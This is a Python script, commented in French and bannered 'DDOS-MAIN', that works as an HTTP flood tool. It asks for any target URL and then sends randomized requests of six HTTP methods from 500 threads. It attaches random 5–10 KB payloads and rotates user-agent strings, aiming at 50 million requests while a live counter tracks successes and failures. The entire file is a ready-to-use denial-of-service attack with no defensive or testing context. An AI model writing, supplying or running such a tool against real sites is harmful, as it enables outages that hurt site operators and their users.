import re
import requests
import threading
import random
import string
import time
import os

total_requests = 50000000
thread_count = 500
delay_between_requests = 0.0005
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
    'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.120 Mobile Safari/537.36',
]
methods = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'HEAD']
stop_event = threading.Event()
http_target = ""
request_count = 0
success_count = 0
error_count = 0
lock = threading.Lock()
def ascii_art():
    """Affiche un logo stylé"""
    os.system("cls" if os.name == "nt" else "clear")
    print("""

▀██▀▀█▄   ▀██▀▀█▄    ▄▄█▀▀██    ▄█▀▀▀▄█        ▀██    ██▀     █     ▀██▀ ▀█▄   ▀█▀ 
 ██   ██   ██   ██  ▄█▀    ██   ██▄▄  ▀         ███  ███     ███     ██   █▀█   █  
 ██    ██  ██    ██ ██      ██   ▀▀███▄         █▀█▄▄▀██    █  ██    ██   █ ▀█▄ █  
 ██    ██  ██    ██ ▀█▄     ██ ▄     ▀██  ████  █ ▀█▀ ██   ▄▀▀▀▀█▄   ██   █   ███  
▄██▄▄▄█▀  ▄██▄▄▄█▀   ▀▀█▄▄▄█▀  █▀▄▄▄▄█▀        ▄█▄ █ ▄██▄ ▄█▄  ▄██▄ ▄██▄ ▄█▄   ▀█  

                                                                           
""")
def generate_payload():
    """Génère un payload aléatoire pour les requêtes POST et PUT."""
    payload_size = random.randint(5000, 10000)
    return ''.join(random.choices(string.ascii_letters + string.digits, k=payload_size))
def send_request():
    """Envoie des requêtes HTTP en boucle et affiche le statut en temps réel."""
    global request_count, success_count, error_count
    session = requests.Session()

    while not stop_event.is_set():
        payload = generate_payload()
        headers = {'User-Agent': random.choice(user_agents)}
        request_type = random.choice(methods)
        try:
            if request_type == 'GET':
                response = session.get(http_target, headers=headers, timeout=5)
            elif request_type == 'POST':
                response = session.post(http_target, data=payload, headers=headers, timeout=5)
            elif request_type == 'PUT':
                response = session.put(http_target, data=payload, headers=headers, timeout=5)
            elif request_type == 'DELETE':
                response = session.delete(http_target, headers=headers, timeout=5)
            elif request_type == 'OPTIONS':
                response = session.options(http_target, headers=headers, timeout=5)
            else:
                response = session.head(http_target, headers=headers, timeout=5)
            with lock:
                request_count += 1
                if response.status_code < 400:
                    success_count += 1
                    print(f"✅ [{request_type}] {http_target} - {response.status_code} - OK")
                else:
                    error_count += 1
                    print(f"❌ [{request_type}] {http_target} - {response.status_code} - Échec")
        except requests.exceptions.RequestException:
            with lock:
                error_count += 1
            print(f"❌ [{request_type}] {http_target} - Erreur de connexion")
        time.sleep(delay_between_requests)
def display_stats():
    """Affiche les statistiques toutes les secondes."""
    while not stop_event.is_set():
        time.sleep(1)
        with lock:
            os.system("cls" if os.name == "nt" else "clear")
            ascii_art()
            print("────────────────────────────────────────")
            print(f"🎯 Cible : {http_target}")
            print(f"📊 Requêtes envoyées : {request_count}")
            print(f"✅ Succès : {success_count}")
            print(f"❌ Erreurs : {error_count}")
            print("────────────────────────────────────────")
def start_attack():
    global http_target
    ascii_art()
    url = input("Entre une URL : ").strip()
    if not url:
        print("❌ Erreur : Veuillez entrer une URL valide !")
        return
    http_target = url
    stop_event.clear()
    print(f"\n🚀 LANCEMENT : {total_requests} requêtes sur {url} ({thread_count} threads)")
    time.sleep(2)
    threading.Thread(target=display_stats, daemon=True).start()
    for _ in range(thread_count):
        thread = threading.Thread(target=send_request)
        thread.daemon = True
        thread.start()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        stop_attack()
def stop_attack():
    """Stoppe l'attaque proprement."""
    stop_event.set()
    print("\n🛑 Arrêt immédiat en cours...")
    time.sleep(2)
    print("✅ Attaque stoppée !")
if __name__ == "__main__":
    start_attack()